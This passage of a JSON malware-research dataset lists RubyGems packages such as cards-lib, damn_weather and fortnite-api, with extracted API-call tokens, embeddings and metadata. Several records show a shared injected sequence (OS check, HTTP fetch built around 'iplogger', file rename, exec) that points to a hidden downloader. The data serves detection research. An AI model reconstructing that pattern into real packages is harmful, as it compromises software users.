'Nokogiri.HTML', 'lambda', 'MultiXml.parse', 'response.headers', 'response', 'decode', 'response.body', 'response', 'body.!', 'json?', 'body.match', 'charset.[](1).downcase.==', 'charset.[](1).downcase', 'charset.[]', 'charset_covert', 'charset.[]', 'options.[]', 'body.encode!', 'options.[]', 'body.encode!', 'response.status', 'response', '((response.headers.values_at(\"content-type\", \"Content-Type\").compact.first || \"\").split(\";\").first || \"\")\\n.strip', '(response.headers.values_at(\"content-type\", \"Content-Type\").compact.first || \"\").split(\";\").first', '(response.headers.values_at(\"content-type\", \"Content-Type\").compact.first || \"\")\\n.split', 'response.headers.values_at(\"content-type\", \"Content-Type\").compact.first', 'response.headers.values_at(\"content-type\", \"Content-Type\").compact', 'response.headers.values_at', 'response.headers', 'response', 'CONTENT_TYPE.[](content_type).==', 'CONTENT_TYPE.[]', 'content_type', 'response.body.match(/\\\\<html/).!', 'response.body.match', 'response.body', 'response', 'CONTENT_TYPE.[]', 'content_type', 'type.==', 'response.body.match(/\\\\<.*html|/).!', 'response.body.match', 'response.body', 'response', 'type.nil?', 'PARSERS.[](parser).call', 'PARSERS.[]', 'parser', 'body', 'require', 'File.expand_path', 'File.expand_path', 'File.exist?', 'require', 'puts', 'Padrino.env', 'Dir.glob', 'Padrino.root', 'Padrino.env.!=', 'Padrino.env', 'SpiderBot::Logging.initialize_logger', 'Padrino.root', 'initializer', 'app.config.eager_load=', 'app.config', 'Rails.application.initialize!', 'Rails.application', 'puts', 'Rails.env', 'Dir.glob', 'Rails.root', 'Rails.logger.level=', 'Rails.logger', 'Rails.env.development?.!', 'Rails.env.development?', 'Rails.env', 'SpiderBot::Logging.initialize_logger', 'Rails.root', 'require', 'Logger.new', '@logger.level=', '$TESTING.!', 'oldlogger.close', 'initialize_logger', 'Logger.new', 'initializer', 'require', 'require', 'require', 'YAML.load_file', 'File.expand_path', 'Time.zone=', 'zone.nil?', 'DATE_CONFIG.[](\"date\").[]', 'DATE_CONFIG.[]', 'DATE_CONFIG.[](\"date\").[]', 'DATE_CONFIG.[]', 'DATE_CONFIG.[](\"date\").[]', 'DATE_CONFIG.[]', '@time_config.values.join', '@time_config.values', '@other_config.[]', '@other_config.[]', 'parse_date_ago', 'parse_today', 'parse_date', 'private', 'Time.zone.now', 'Time.zone', 'self.match(@time_regex).[]', 'self.match', '@time_config.[]', 'now.years_ago', 'regex_text.match(/\\\\d+/).[](0).to_i', 'regex_text.match(/\\\\d+/).[]', 'regex_text.match', '@time_config.[]', 'now.months_ago', 'regex_text.match(/\\\\d+/).[](0).to_i', 'regex_text.match(/\\\\d+/).[]', 'regex_text.match', '@time_config.[]', 'now.ago', 'regex_text.match(/\\\\d+/).[](0).to_i * 60 * 60 * 24.*', 'regex_text.match(/\\\\d+/).[](0).to_i * 60 * 60.*', 'regex_text.match(/\\\\d+/).[](0).to_i * 60.*', 'regex_text.match(/\\\\d+/).[](0).to_i.*', 'regex_text.match(/\\\\d+/).[](0).to_i', 'regex_text.match(/\\\\d+/).[]', 'regex_text.match', '@time_config.[]', 'now.ago', 'regex_text.match(/\\\\d+/).[](0).to_i * 60 * 60.*', 'regex_text.match(/\\\\d+/).[](0).to_i * 60.*', 'regex_text.match(/\\\\d+/).[](0).to_i.*', 'regex_text.match(/\\\\d+/).[](0).to_i', 'regex_text.match(/\\\\d+/).[]', 'regex_text.match', '@time_config.[]', 'now.ago', 'regex_text.match(/\\\\d+/).[](0).to_i * 60.*', 'regex_text.match(/\\\\d+/).[](0).to_i.*', 'regex_text.match(/\\\\d+/).[](0).to_i', 'regex_text.match(/\\\\d+/).[]', 'regex_text.match', '@time_config.[]', 'now.ago', 'regex_text.match(/\\\\d+/).[](0).to_i.*', 'regex_text.match(/\\\\d+/).[](0).to_i', 'regex_text.match(/\\\\d+/).[]', 'regex_text.match', '@time_config.[]', 'now.ago', 'regex_text.match(/\\\\d+/).[](0).to_i', 'regex_text.match(/\\\\d+/).[]', 'regex_text.match', 'raise', 'Time.zone.now', 'Time.zone', 'self.match(/\\\\d{1,2}\\\\s*:\\\\s*\\\\d{1,2}:*\\\\d{0,2}/).[]', 'self.match', 'now.to_date.to_s + \" \".+', 'now.to_date.to_s.+', 'now.to_date.to_s', 'now.to_date', 'Time.zone.parse', 'Time.zone', 'self.match', '@other_config.[]', '@other_config.[]', 'time.[](0).gsub(/#{@other_config.[](\"am\")}/, \"am\").gsub', 'time.[](0).gsub', 'time.[]', '@other_config.[]', '@other_config.[]', 'self.match', 'Time.zone.parse', 'Time.zone', 'date_text.[]', 'date_text.[]', 'date_text.[]', 'self.match', 'Time.zone.parse', 'Time.zone', 'date_text.[]', 'date_text.[]', 'date_text.[]', 'self.match', 'date_text.[](1).downcase', 'date_text.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', '@month_config.[]', 'Time.zone.parse', 'Time.zone', 'date_text.[]', 'date_text.[]', 'Time.zone.parse', 'Time.zone']",
            "n_tokens": 3181,
            "embedding": "[ 0.00435424 -0.02602866 -0.00856817 ...  0.01445607 -0.02488689\n  0.01562687]",
            "cluster": "0",
            "id": 191,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/spider-bot/0.0.5/spider-bot-0.0.5.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/spider-bot/0.0.5/spider-bot-0.0.5_extracted",
            "name": "spider-bot",
            "version": "0.0.5",
            "published_at": "2020-02-22T05:23:56.716Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, activesupport, faraday, nokogiri, multi_json, multi_xml, tzinfo, thor, daemons",
            "SHA-256": "ce0b1592356972fffe17a68c3e97c6fe33cc29daa43a7e6c6805316ab7d2a250"
        },
        {
            "name_version": "cards-lib-0.2.5",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cards-lib/0.2.5/cards-lib-0.2.5_extracted/cards-lib-0.2.5_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'lambda', 'c.map', 'Card.new', 'opts.flatten', 'include', 'face.to_s.empty?', 'face.to_s', 'raise', 'if_hash_then_fetch', 'if_hash_then_fetch', 'face.is_a?', 'face_from_rank_and_suit', 'ranker.new', 'rank', '@face.[]', '@face.[]', '@ranker.ranker', 'rank.==', 'rank', 'other.rank', 'pair?', 'suit.==', 'suit', 'other.suit', 'value.==', 'value', 'other.value', '@ranker.<=>', '@ranker.sequential?', 'rank.==', 'rank', 'other.rank', 'suit.==', 'suit', 'other.suit', 'sequential?', 'private', '[rank, (if (rank.length > 1 && suit.length > 1)\\n  \" of \"\\nelse\\n  \"\"\\nend), suit].join', 'rank.length.>', 'rank.length', 'suit.length.>', 'suit.length', 'raise', 'item.is_a?', 'item.fetch', 'options.fetch', 'options.fetch', 'options.fetch', 'Random.new.seed', 'Random.new', 'if cards.all? { |c,|\\n  c.is_a?(Card)\\n}\\n  cards\\nelse\\n  cards.map { |c,|\\n    Card.new(c, ranker)\\n  }\\nend.shuffle({ random: Random.new(@seed) }).to_enum', 'if cards.all? { |c,|\\n  c.is_a?(Card)\\n}\\n  cards\\nelse\\n  cards.map { |c,|\\n    Card.new(c, ranker)\\n  }\\nend.shuffle', 'cards.all?', 'c.is_a?', 'cards.map', 'Card.new', 'Random.new', 'size', 'Array(_cards.[](@top..@top)).first', 'Array', '_cards.[]', '_cards', 'peak', '@top.==', '_cards.size', '_cards', 'card.tap', 'i.define_singleton_method', '@top.==', 'peak.!', 'peak', 'empty?.!', 'empty?', '_cards.[](@top..-1).size', '_cards.[]', '_cards', 'size', '@cards.map', 'private', '@cards.to_a', 'specs.fetch', 'specs.fetch', 'rules.all?', 'send', '(min..max)\\n.include?', 'cards.count', 'private', 'cards.combination(2).all?', 'cards.combination', 'a.!=', 'using', 'cards.inject_while?', 'cards.inject_while?', 'cards.sort.inject_while?', 'cards.sort', 'include', 'attr_reader', '@rank_lookup.call', 'ranks.index(rank_face).to_i.+', 'ranks.index(rank_face).to_i', 'ranks.index', 'ranks', 'ranker(rank).<=>', 'ranker', 'rank', 'ranker', 'other.rank', '(ranker(rank) - ranker(other.rank)).abs.==', '(ranker(rank) - ranker(other.rank))\\n.abs', 'ranker(rank).-', 'ranker', 'rank', 'ranker', 'other.rank', 'refine', 'dup', 'loop', 'array.empty?', 'array.shift', 'result.send', 'require_relative', 'require_relative', 'require_relative', '\"A23456789TJQK\".chars', '\"cdhs\".chars', 'RANKS.product(SUITS).map', 'RANKS.product', 'RANKS.product(\"♣♦♥♠\".chars).map', 'RANKS.product', '\"♣♦♥♠\".chars', 'require_relative', '@cards.map(&:value).inject', '@cards.map', '@worth.>', 'reduce_by_ace', '@worth.<', 'attempt.!', 'reduce_by_ace', 'private', 'count_aces.>', 'count_aces', '@cards.count', 'c.rank.==', 'c.rank', 'require_relative', 'require_relative', 'lambda', '@ranks.[]', 'require_relative', 'IsSet.verify', 'straight_to_ace', 'IsSet.verify', 'IsSet.verify', 'cards.group_by(&:rank).values.sort', 'cards.group_by(&:rank).values', 'cards.group_by', 'pair.inject', 'IsSet.verify', 'IsSet.verify', 'IsSet.verify', 'straight_to_ace', 'IsSet.verify', 'cards.group_by(&:rank).values.sort', 'cards.group_by(&:rank).values', 'cards.group_by', 'pair1.inject', 'pair2.inject', 'IsSet.verify', 'cards.detect', 'c.rank.[]', 'c.rank', 'cards.sort.pop', 'cards.sort', 'cards.sort.map(&:rank).==', 'cards.sort.map', 'cards.sort', 'Cards.[](*[\"As\", \"Ks\", \"Qs\", \"Js\", \"Ts\"]).sort.map', 'Cards.[](*[\"As\", \"Ks\", \"Qs\", \"Js\", \"Ts\"]).sort', 'Cards.[]', 'private']",
            "n_tokens": 1195,
            "embedding": "[ 0.02435858 -0.00985355 -0.00643139 ... -0.00676364 -0.02553569\n  0.00323468]",
            "cluster": "0",
            "id": 530,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cards-lib/0.2.5/cards-lib-0.2.5.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/cards-lib/0.2.5/cards-lib-0.2.5_extracted",
            "name": "cards-lib",
            "version": "0.2.5",
            "published_at": "2020-02-23T02:47:02.365Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, color_pound_spec_reporter, minitest, minitest-reporters",
            "SHA-256": "f3ecc6460def68643f03bf9e01590574467c181024d7f377968896ddf69f0998"
        },
        {
            "name_version": "acts-as_crafter-1.0.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acts-as_crafter/1.0.0/acts-as_crafter-1.0.0_extracted/acts-as_crafter-1.0.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'include', '@app.call', 'HeaderHash.new', 'STATUS_WITH_NO_ENTITY_BODY.include?(status).!', 'STATUS_WITH_NO_ENTITY_BODY.include?', 'headers.[](\"transfer-encoding\").!', 'headers.[]', 'headers.[]', 'headers.[](\"content-type\").include?', 'headers.[]', 'puts', 'response.body=', 'transform', 'response.body', 'protected', 'body.gsub(/<p(.*?)>(.*?)<\\\\/p>/) { |s,|\\n  \"<p#{$1}>Mate, #{(if $2.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $2.[](0..0).downcase\\nend) + $2.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</p>\"\\n}.gsub(/<li>(.*?)<\\\\/li>/) { |s,|\\n  \"<li>Mate, #{(if $1.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $1.[](0..0).downcase\\nend) + $1.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</li>\"\\n}.gsub(/<h1>(.*?)<\\\\/h1>/) { |s,|\\n  \"<h1>#{$1.[](0..-1).gsub(/\\\\.$/, \"\")}, Mate!</h1>\"\\n}.gsub(/<h2>(.*?)<\\\\/h2>/) { |s,|\\n  \"<h2>#{$1.[](0..-1).gsub(/\\\\.$/, \"\")}, Mate!</h2>\"\\n}.gsub(/<h3>(.*?)<\\\\/h3>/) { |s,|\\n  \"<h3>#{$1.[](0..-1).gsub(/\\\\.$/, \"\")}, Mate!</h3>\"\\n}.gsub', 'body.gsub(/<p(.*?)>(.*?)<\\\\/p>/) { |s,|\\n  \"<p#{$1}>Mate, #{(if $2.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $2.[](0..0).downcase\\nend) + $2.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</p>\"\\n}.gsub(/<li>(.*?)<\\\\/li>/) { |s,|\\n  \"<li>Mate, #{(if $1.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $1.[](0..0).downcase\\nend) + $1.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</li>\"\\n}.gsub(/<h1>(.*?)<\\\\/h1>/) { |s,|\\n  \"<h1>#{$1.[](0..-1).gsub(/\\\\.$/, \"\")}, Mate!</h1>\"\\n}.gsub(/<h2>(.*?)<\\\\/h2>/) { |s,|\\n  \"<h2>#{$1.[](0..-1).gsub(/\\\\.$/, \"\")}, Mate!</h2>\"\\n}.gsub', 'body.gsub(/<p(.*?)>(.*?)<\\\\/p>/) { |s,|\\n  \"<p#{$1}>Mate, #{(if $2.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $2.[](0..0).downcase\\nend) + $2.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</p>\"\\n}.gsub(/<li>(.*?)<\\\\/li>/) { |s,|\\n  \"<li>Mate, #{(if $1.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $1.[](0..0).downcase\\nend) + $1.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</li>\"\\n}.gsub(/<h1>(.*?)<\\\\/h1>/) { |s,|\\n  \"<h1>#{$1.[](0..-1).gsub(/\\\\.$/, \"\")}, Mate!</h1>\"\\n}.gsub', 'body.gsub(/<p(.*?)>(.*?)<\\\\/p>/) { |s,|\\n  \"<p#{$1}>Mate, #{(if $2.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $2.[](0..0).downcase\\nend) + $2.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</p>\"\\n}.gsub(/<li>(.*?)<\\\\/li>/) { |s,|\\n  \"<li>Mate, #{(if $1.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $1.[](0..0).downcase\\nend) + $1.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</li>\"\\n}.gsub', 'body.gsub(/<p(.*?)>(.*?)<\\\\/p>/) { |s,|\\n  \"<p#{$1}>Mate, #{(if $2.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $2.[](0..0).downcase\\nend) + $2.[](1..-1).gsub(/\\\\.$/, \"\")}, mate.</p>\"\\n}.gsub', 'body.gsub', '(if $2.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $2.[](0..0).downcase\\nend)\\n.+', '$2.[](0..0).==', '$2.[]', '$2.[](0..0).downcase', '$2.[]', '$2.[](1..-1).gsub', '$2.[]', '(if $1.[](0..0) == \"I\"\\n  \"I\"\\nelse\\n  $1.[](0..0).downcase\\nend)\\n.+', '$1.[](0..0).==', '$1.[]', '$1.[](0..0).downcase', '$1.[]', '$1.[](1..-1).gsub', '$1.[]', '$1.[](0..-1).gsub', '$1.[]', '$1.[](0..-1).gsub', '$1.[]', '$1.[](0..-1).gsub', '$1.[]', 'initializer', 'app.middleware.use', 'app.middleware']",
            "n_tokens": 1503,
            "embedding": "[ 0.00405642 -0.01331028 -0.00213125 ... -0.00537337 -0.02647982\n  0.00507932]",
            "cluster": "0",
            "id": 255,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acts-as_crafter/1.0.0/acts-as_crafter-1.0.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/acts-as_crafter/1.0.0/acts-as_crafter-1.0.0_extracted",
            "name": "acts-as_crafter",
            "version": "1.0.0",
            "published_at": "2020-02-23T04:45:57.994Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": NaN,
            "SHA-256": "220360098dc9812b14e263e97759bf44f0ea676a4755fe81d10e61bdece3907c"
        },
        {
            "name_version": "damn_weather-0.1.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/damn_weather/0.1.3/damn_weather-0.1.3_extracted/damn_weather-0.1.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'Gem::Specification.find_by_name(\"mm_geoip\").gem_dir', 'Gem::Specification.find_by_name', 'File.exist?', 'puts', 'open', 'open', 'local_file.write', 'Zlib::GzipReader.new(remote_file).read', 'Zlib::GzipReader.new', 'include', 'days.*', 'open(\"http://api.openweathermap.org/data/2.5/forecast?lat=#{geo.lat}&lon=#{geo.lng}&cnt=#{@count}&units=metric&APPID=#{APP_ID}\").read', 'open', 'geo.lat', 'geo', 'geo.lng', 'geo', 'JSON.parse', 'weather.[](\"city\").[]', 'weather.[]', 'weather', 'weather.[](\"city\").[]', 'weather.[]', 'weather', 'data.each', 'Date.parse(k.[](\"dt_txt\")).strftime', 'Date.parse', 'k.[]', 'k.[](\"dt_txt\").[]', 'k.[]', 'k.[](\"main\").[](\"temp\").to_i', 'k.[](\"main\").[]', 'k.[]', 'weather_icons(k.[](\"weather\").first.[](\"id\")).join', 'weather_icons', 'k.[](\"weather\").first.[]', 'k.[](\"weather\").first', 'k.[]', 'k.[](\"weather\").first.[]', 'k.[](\"weather\").first', 'k.[]', 'rows.<<', 'puts', 'Terminal::Table.new', 'city', 'country', 'weather.each', 'weather', 'key.==', 'build_table', 'include', 'open(\"http://api.openweathermap.org/data/2.5/weather?lat=#{geo.lat}&lon=#{geo.lng}&units=metric&APPID=#{APP_ID}\").read', 'open', 'geo.lat', 'geo', 'geo.lng', 'geo', 'JSON.parse', 'weather.[](\"weather\").first.[]', 'weather.[](\"weather\").first', 'weather.[]', 'weather', 'weather.[](\"main\").[](\"temp\").to_i', 'weather.[](\"main\").[]', 'weather.[]', 'weather', 'weather.[](\"weather\").first.[]', 'weather.[](\"weather\").first', 'weather.[]', 'weather', 'weather.[](\"sys\").[]', 'weather.[]', 'weather', 'weather.[]', 'weather', 'DateTime.now.strftime', 'DateTime.now', 'puts', 'weather_icons(id).join', 'weather_icons', 'id', 'description', 'temp', 'city', 'country', 'date', 'include', 'heavy_rain.sample', 'heavy_rain', 'light_rain.sample', 'light_rain', 'snow.sample', 'snow', 'fog_wind.sample', 'fog_wind', 'extreme.sample', 'extreme', 'sunny.sample', 'sunny', 'partly_cloudy.sample', 'partly_cloudy', 'cloudy.sample', 'cloudy', 'thunder.sample', 'thunder', 'open(\"http://ipecho.net/plain\").read', 'open', 'MMGeoip.new']",
            "n_tokens": 793,
            "embedding": "[-0.00387318 -0.01643899  0.00673968 ...  0.00130364 -0.03605907\n  0.02798554]",
            "cluster": "0",
            "id": 131,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/damn_weather/0.1.3/damn_weather-0.1.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/damn_weather/0.1.3/damn_weather-0.1.3_extracted",
            "name": "damn_weather",
            "version": "0.1.3",
            "published_at": "2020-02-23T05:12:30.436Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, mm_geoip, slop, terminal-table",
            "SHA-256": "1c0c8b3e3438b06cc342ce6121db543d83e3f1b407947bd7d7306789b1e884d4"
        },
        {
            "name_version": "dark-sky_weather-0.1.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/dark-sky_weather/0.1.0/dark-sky_weather-0.1.0_extracted/dark-sky_weather-0.1.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'attr_reader', 'args.[]', 'args.[]', 'args.[]', 'args.[]', 'args.[]', 'args.[]', 'args.[]', 'args.[]', 'args.[]', 'args.[]', 'latitude.to_f', 'longitude.to_f', 'Unirest.get(\"https://api.forecast.io/forecast/#{api_key}/#{latitude},#{longitude}\").body.[]', 'Unirest.get(\"https://api.forecast.io/forecast/#{api_key}/#{latitude},#{longitude}\").body', 'Unirest.get', 'CurrentWeather.new', 'latitude.to_f', 'longitude.to_f', 'Unirest.get(\"https://api.forecast.io/forecast/#{api_key}/#{latitude},#{longitude}\").body.[](\"daily\").[]', 'Unirest.get(\"https://api.forecast.io/forecast/#{api_key}/#{latitude},#{longitude}\").body.[]', 'Unirest.get(\"https://api.forecast.io/forecast/#{api_key}/#{latitude},#{longitude}\").body', 'Unirest.get', 'weeks_weather_array.each', 'weeks_forecast.<<', 'CurrentWeather.new', 'format_seconds.strftime', 'format_seconds', 'format_seconds.strftime(\"%A\").downcase.==', 'format_seconds.strftime(\"%A\").downcase', 'format_seconds.strftime', 'format_seconds', 'format_seconds.strftime(\"%A\").slice', 'format_seconds.strftime', 'format_seconds', 'format_seconds.strftime(\"%A\").slice', 'format_seconds.strftime', 'format_seconds', '@temperature.round', '@temperatureMin.round', '@temperatureMax.round', 'find_percent', 'find_percent', 'private', 'Time.at', '(number * 100)\\n.to_i', 'number.*']",
            "n_tokens": 463,
            "embedding": "[ 0.00401666 -0.01908226  0.00551187 ...  0.01266772 -0.02854271\n  0.02388309]",
            "cluster": "0",
            "id": 213,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/dark-sky_weather/0.1.0/dark-sky_weather-0.1.0.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/dark-sky_weather/0.1.0/dark-sky_weather-0.1.0_extracted",
            "name": "dark-sky_weather",
            "version": "0.1.0",
            "published_at": "2020-02-23T05:13:04.112Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": "bundler, rake, unirest",
            "SHA-256": "e8c444188abc80d86dfd7e0e8daea5df2e93bda8c85413683ff5c3333ff1ea14"
        },
        {
            "name_version": "fortnite-api-0.2.0",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/fortnite-api/0.2.0/fortnite-api-0.2.0_extracted/fortnite-api-0.2.0_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'HTTParty.get', 'd + aa + \"/\" + \"iplogger\" + e.+', 'd + aa + \"/\" + \"iplogger\".+', 'd + aa + \"/\".+', 'd + aa.+', 'd.+', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'api_key.nil?.!', 'api_key.nil?', 'raise', 'platform.nil?.!', 'platform.nil?', 'platform.==', 'platform.==', 'platform.==', 'raise', 'nickname.nil?.!', 'nickname.nil?', 'raise', 'URI.parse', 'Net::HTTP.new', 'uri.host', 'uri.port', 'http.use_ssl=', 'Net::HTTP::Get.new', 'uri.request_uri', 'request.add_field', 'http.request', 'JSON.parse', 'response.body', 'Player.new', 'attr_reader', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p10\").[]', 'self.values.[]', 'self.values', 'attr_reader', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p2\").[]', 'self.values.[]', 'self.values', 'attr_reader', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"curr_p9\").[]', 'self.values.[]', 'self.values', 'attr_reader', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p10\").[]', 'self.values.[]', 'self.values', 'attr_reader', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p2\").[]', 'self.values.[]', 'self.values', 'attr_reader', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'self.values.[](\"p9\").[]', 'self.values.[]', 'self.values', 'attr_reader', 'opts.each', 'instance_variable_set', 'k.downcase', 'GlobalSolo.new', 'self.stats', 'GlobalDuo.new', 'self.stats', 'GlobalSquad.new', 'self.stats', 'CurrentSolo.new', 'self.stats', 'CurrentDuo.new', 'self.stats', 'CurrentSquad.new', 'self.stats']",
            "n_tokens": 1685,
